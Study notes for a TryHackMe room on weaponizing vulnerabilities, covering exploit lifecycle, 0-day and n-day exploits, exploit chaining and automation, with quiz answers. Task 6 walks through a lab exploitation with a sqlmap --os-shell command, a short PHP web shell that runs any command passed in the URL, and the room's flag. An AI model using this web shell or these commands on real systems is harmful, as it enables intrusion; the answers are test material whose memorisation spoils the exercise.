---
{"dg-publish":true,"permalink":"/try-hack-me/rooms/weaponizing-vulnerabilities/","created":"2025-03-10T17:27:16.376-04:00","updated":"2025-03-11T00:32:59.471-04:00"}
---

# Task 1 - Introduction

- Process of taking a known vulnerability in a software or system and creating an exploit for it 
	- Used for unauthorized access or perform other malicious actions. 
- **Goal of Weaponizing Vulnerabilities**
	- Take advantage of a single vulnerability or set of vulnerabilities that can be chained to get elevated access to a system. 
		- Encompasses all physical hardware, virtual platforms, cloud-based resources, mobile devices, etc.
- **Multi-stage exploitation or exploit chaining**
	- Exploits can be chained together to take control of a target system system.
	- A vulnerability's impact can be low since if it's more difficult to access, it can still be simple to attack. 
	- Suppose the exploit is adequately implemented and managed. 
		- Low-level vulnerabilities may give attackers access that will allow them to enter networks and systems 
		- Can then exploit other flaws that could be harder to access directly
# Task 2 - What is an Exploit?

- Can take various forms, like an executable
	- Delivered through a text message, email attachment, or even a file that is hidden within digital files.
- Allows an attacker to perform various actions on the targeted system 
	- Controlling it remotely or locally, disrupting its functionality, stealing data, etc.
- An attacker can execute code locally to escalate their privileges. 
	- Can also install additional malicious code or gain remote control of the resource.
- **Remote exploit**
	- Exploits a vulnerability remotely over a network or communication channel to gain control of a system
- An exploit is a **technical tool** that may be used against any user in a standalone or connected cyber environment.
	- In a standalone environment, an exploit may be delivered via removable media. 
- Can be developed and financed by various actors, including nation-states actors, organized criminal groups, and dark web hackers
- An exploit **is not the end goal** 
	- It is a method for carrying out much more significant tasks. 
	- Exploit creation is a complicated process requiring high information security expertise.

> [!Question]
>  **What is the term for an exploit that is used to gain control of a system remotely?**

> [!Success] Answer
> Remote exploit

# Task 3 - Vulnerability Lifecycle

- **Vulnerability Disclosure Program (VDP)**
	- Better understand how vulnerabilities can be mitigated earlier.
	- Involves triage, validation, and mitigation facilitation of vulnerability reports submitted by researchers. 
	- The five stages of the Lifecycle of a **Vulnerability Framework** are 
		- Discovery, Coordination, Mitigation, Management, and Lessons Learned
- **Vulnerability Lifecycle General Stages** 
	- **Product Launched** 
		- Public vendor launches a product (hardware or software).
	- **Vulnerability Discovery (Public or Private)** 
		- Researchers working independently or sponsored by private/public organizations for various interests discover vulnerabilities in the product. 
		- **0-day vulnerability** 
			- Yet to be made public after being found. 
		- When a vulnerability is found
			- Made available to the general public 
			- Before the vulnerability is publicly disclosed online,
				- the manufacturer typically has already developed a patch or update for the product at this stage.
	- **Development of a Proof of Concept (PoC) or Exploit** 
		- Prepared in-house by the vendor or received from bug bounty hunters/independent researchers. 
		- Crucial at this stage to keep the vulnerability disclosure **discrete** 
			- PoC is usually the first stage in developing an exploit, and bad actors can use it in the wild.
	- **Patch Development or Update** 
		- Patch or update is made to prevent the exploit of known vulnerability
	- **Patch Release** 
		- Patch for vulnerability is released so the customers can apply it to the product in their environment.
	- **Patch Install** 
		- The customer or end-users update or patch their systems, so the known vulnerability cannot be used against it.

> [!Question]
>  **A vulnerability not patched by the vendor and unknown to most people is called a?**

> [!Success] Answer
> 0-day

> [!Question]
>  **What is a commonly used term for a demonstration that proves the exploitability of a newly discovered vulnerability?**

> [!Success] Answer
> Proof of concept

> [!Question]
>  **What does a product manufacturer typically release to prevent a known vulnerability from being exploited by adversaries?**

> [!Success] Answer
> Patch

# Task 4 - Opportunity for Weaponizing Vulnerabilities

- Weaponizing vulnerabilities requires a deep understanding of the target resource
- Creating an exploit takes **time, expertise, and knowledge of the target** technology to be weaponized or exploitable. 
- A vulnerability may be weaponized by **locally developing an exploit or purchasing it from suppliers**. 
- Opportunity for weaponizing a vulnerability
	- **0-Day Exploit**
		- Vulnerability discovery
		- Development of exploit
			- CVE assigned
		- Development of patch
	- **N-day exploit**
		- Patch released
			- CVE Published
		- Patch applied
- The window of opportunity depends on several factors
	- Update availability, discovery time, and failure severity.
	- Exploiting **0-day vulnerabilities can take a few days to several months or even years**. 
- Since 0-day attacks are typically targeted at specific targets, finding them takes time and effort. 
- **N-day** 
	- Exploit with a patch available. Here "**n**" refers to the number of days elapsed since the patch was released.
- Date when a vulnerability has first been discovered is typically unknown
	- CVE database shows the dates of CVE-ID assignments and publications. 
	- Are often released as soon as the vendors push out the patch.
	- **Adversaries with access to the updated software can reverse-engineer the patch to find the vulnerability**. 
- Most public exploits are created in the first week **following the release** of a patch. 
- Manufacturers might postpone the CVE announcement to give more time for customers to patch.
- When a CVE is formally released, security providers begin creating their vulnerability signatures and prevention strategies

> [!Question]
>  **Can it take days, months, or even years to develop a 0-day exploit? (yea/nay)**

> [!Success] Answer
> yea

> [!Question]
>  **An exploit developed once the vendor has released the patch is called?**

> [!Success] Answer
> n-day

# Task 5 - Exploit Chaining

- **Exploit chaining/multi-stage exploitation**
	- Technique to string together multiple exploits for vulnerabilities to gain complete control of a target system. 
	- The desired goal is to develop a complete **Remote Code Execution (RCE) chain**
		- Allows attacker to execute arbitrary code on the target system with the highest privileges.
- **Reconnaissance** 
	- Gather information about the target system and its vulnerabilities. 
	- Network scanning, port scanning, and vulnerability scanning.
- **Initial Exploit** 
	- Uses the information from recon phase to identify an initial vulnerability that can be exploited
	- Exploit takes advantage of this vulnerability to gain access to the target system.
- **Privilege Escalation** 
	- Access sensitive information, such as login credentials and system files, and execute code with higher privileges.
- **Persistence** 
	- Use other exploits to establish persistence on the target system 
	- Can maintain access even if the initial exploit is discovered and patched.
- **Lateral Movement** 
	- Use additional exploits to move laterally through the target system's network and compromise other systems. 
	- Can gain access to additional sensitive information and resources.
- **RCE** 
	- Use the final exploit in the chain to gain RCE. 
	- Malware to gain control of the target system or a privilege escalation exploit to gain access to the target system's kernel.
- Allows for bypass multiple layers of security and gain access to sensitive information and resources. 
- Organizations must keep their systems updated and patched and implement proper network segmentation and best security practices to minimize risk

# Task 6 - Chaining Multiple Vulnerabilities - A Case Study

Questions based off following a case study provided with a vulnerable web server

> [!Question]
>  **What is the response when we enter email test@chatai.com' as user email and password `123` in the login form?**

First went to the website given, "`http://10.10.127.78/ai/login.php`"

![](/img/user/TryHackMe/THM_Images/8b45df3f313b17020f015d747a95b23c.png)

First used a valid email address with a provided password

![](../THM_Images/Pasted%20image%2020250310235445.png)
![](/img/user/TryHackMe/THM_Images/9ef0e30c5c0500c7a490ecbb5a49f0f6.png)

Then tried again, but this time the email being `test@chatai.com'`

![](../THM_Images/Pasted%20image%2020250310235520.png)

![](/img/user/TryHackMe/THM_Images/d1fef0c8512e5806a256d6304e888c6f.png)

Indicates bad error message handling from JavaScript, susceptible to SQL injection

> [!Success] Answer
> Undefined

> [!Question]
>  **Execute the command `whoami`, what is the output you receive?**

Need to get a endpoint by intercepting calls in order to use `sqlmap` to exploit SQL vulnerability

![](/img/user/TryHackMe/THM_Images/82f180ec7c48fbb106de68ebb1a0a019.png)

![](../THM_Images/Pasted%20image%2020250311000101.png)

Got the intercepted URL, ``http://10.10.127.78/ai/includes/user_login.php?email=test%40chatai.com&password=123

Used the **sqlmap** command, `sqlmap -u "http://10.10.127.78/ai/includes/user_login.php?email=test%40chatai.com&password=123" -p email --os-shell` 

![](/img/user/TryHackMe/THM_Images/1c1c144b573fa89cb8b50f9e9262ddf5.png)

![](../THM_Images/Pasted%20image%2020250311001347.png)

Once done running, sqlmap creates a OS shell that we can use to navigate through the target machine.

![](/img/user/TryHackMe/THM_Images/ab4c165eb3a2cda01ee48ab19c48f2a1.png)

![](../THM_Images/Pasted%20image%2020250311001515.png)

Sqlmap also creates a backdoor located on `http://10.10.127.78:80/tmpubngv.php` that we can use to upload any files we want.

We can first create a exploit file called `hack.php`

```
<?php
if(isset($_REQUEST['cmd']))
{
	echo "<pre>"; $cmd = ($_REQUEST['cmd']);
	system ($cmd);
	echo "</pre>";
	die;
}
?>
```

![](/img/user/TryHackMe/THM_Images/453868b6cdea49063cf0cbc658f66bc2.png)

![](../THM_Images/Pasted%20image%2020250311002402.png)

Navigate to the website `http://10.10.127.78:80/tmpubngv.php` and upload the `hack.php` file

![](/img/user/TryHackMe/THM_Images/6b722c41ae655753d0529d7f115c1d0c.png)

![](../THM_Images/Pasted%20image%2020250311002222.png)

Allows us to put in commands in the URL to access the backdoor like http://10.10.127.78:80/hack.php?cmd=dir

> [!Success] Answer
> nt authority\system

> [!Question]
>  **Have you noticed the file flag.txt in the web root directory? What is the flag value?**

![](/img/user/TryHackMe/THM_Images/a55162788292d089e032b79da7cae161.png)
![](../THM_Images/Pasted%20image%2020250311002712.png)

> [!Success] Answer
> THM{010101_PAWNED}

> [!Question]
>  **How many files are available in the `C:\xampp\htdocs\img` folder?**

Was already in `C:\xampp\htdocs`

![](/img/user/TryHackMe/THM_Images/4c2113b8ff3c596c076e2c82e78587dd.png)

> [!Success] Answer
> 2

# Task 7 - Automating Common Tasks

- **Scripts** 
	- System administration, security checks, and data analysis.
	- Automate repetitive tasks
		- Scanning for vulnerabilities, monitoring network traffic, and collecting log data. 
	- Can be used to perform complex tasks
		- Automating incident response procedures and analyzing large data sets. 
		- For example, a script in PHP can to go through log files and identify any malicious URLs or keywords: 
- **Scheduling Tools** 
	- Cron jobs and Windows Task Scheduler can be used to schedule scripts to run at specific times.
	- Automate vulnerability scans, backups, and software updates. 
	- For example
		- Can use a vulnerability scanner tool that automates identifying and analyzing vulnerabilities in the organization's network. 
		- Scans the **network regularly, detecting vulnerabilities** that may have been introduced since the last scan. 
		- Can then generate reports on the vulnerabilities found, categorizing them by severity and providing recommended actions to remediate them. 
- **SOAR Platforms** 
	- Security Orchestration, Automation and Response Platforms
	- Provides a centralized management interface for automating and orchestrating security tasks. 
	- Automate incident response, threat hunting, and incident management tasks. 
	- Integrates with other security tools such as Firewalls, IDS, and SIEM systems. [Shuffler.io](https://shuffler.io/) and [Splunk](https://tryhackme.com/room/splunk101) are a few of the renowned [SOAR](https://tryhackme.com/room/soar) platforms
- **Best practices**
	- Test scripts and automation tools in a controlled environment before deploying them in production.
	- Ensure for well-documentation, easy to understand.
	- Use logging and monitoring to keep track of the tasks that have been automated.
	- Review automation and security checks regularly to ensure they are still practical and relevant.
	- Keep scripts and automation tools updated and patched to address any security vulnerabilities.
- In summary, automating common tasks and security checks can **help organizations streamline operations and improve their overall security posture.**

> [!Question]
>  **As a security engineer, is it important to ensure that automated scripts being executed are acquired from legitimate sources? (yea/nay)**

> [!Success] Answer
> yea
